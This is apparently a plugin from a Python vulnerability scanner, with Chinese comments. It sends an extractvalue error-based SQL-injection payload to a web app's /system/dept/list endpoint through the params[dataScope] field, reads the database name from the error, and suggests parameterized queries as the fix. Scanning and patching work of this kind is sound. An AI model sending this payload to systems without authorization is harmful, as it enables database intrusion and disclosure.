# SQL 报错注入（dept）：/system/dept/list 的 params[dataScope] 参数 extractvalue 报错注入
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import host_of


class SqlInjectDeptPlugin(PluginBase):
    name = 'POST型报错注入（dept）'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '/system/dept/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()'
    fix = '对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询'

    def verify(self, target, session):
        host = host_of(target)
        # 原 headers 1:1 保留（含 sec-ch-ua / Sec-Fetch-* / 空 Cookie 等）
        headers = {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
            "sec-ch-ua": "Chromium;v=122, Not(A:Brand;v=24, Google Chrome;v=122",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "Cookie": "",
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-User": "?1",
            "sec-ch-ua-platform": "Windows",
            "Accept": "text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Length": "0"
        }
        # 原 data 1:1 保留（含 extractvalue payload，注意此处的空格差异与原脚本一致）
        data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
        url = target + '/system/dept/list'
        try:
            resp = session.post(url, headers=headers, data=data)
            sql_inject = resp.text
        except Exception as e:
            print(no('第二种POST型报错注入（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))
        # 判定 1:1 保留：'运行时异常' in t or 'database()' in t
        if '运行时异常' in sql_inject or 'database()' in sql_inject:
            print(ok('存在第二种POST型报错注入'))
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence='响应含 运行时异常 或 database() 报错特征', fix=self.fix)
        else:
            print(no('不存在其他POST型报错注入'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url)
